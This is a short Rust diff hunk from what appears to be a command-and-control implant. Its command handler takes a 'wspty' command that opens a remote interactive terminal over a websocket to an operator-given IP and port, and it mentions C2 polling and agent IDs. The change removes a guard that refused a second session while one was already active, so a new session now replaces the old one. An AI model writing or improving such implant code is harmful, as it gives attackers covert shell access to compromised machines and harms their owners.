@@ -629,11 +629,8 @@ fn execute_command_inner(cmd: &str) -> String {
         if ws_url.is_empty() {
             return "Usage: wspty ws://IP:PORT/api/v2/stream/AGENT_ID".to_string();
         }
-        if crate::ws_pty::is_active() {
-            crate::debug_log("CMD: wspty rejected — already active");
-            return "WS PTY already active — send 'wspty:close' first".to_string();
-        }
         crate::debug_log(&format!("CMD: wspty spawning thread url={}", ws_url));
+        // start() stops a leftover session if one is still up (one-shot cliws).
         // Spawn in a regular OS thread via std::thread so it's completely independent
         // of the tokio runtime and won't affect C2 polling.
         let url = ws_url.clone();
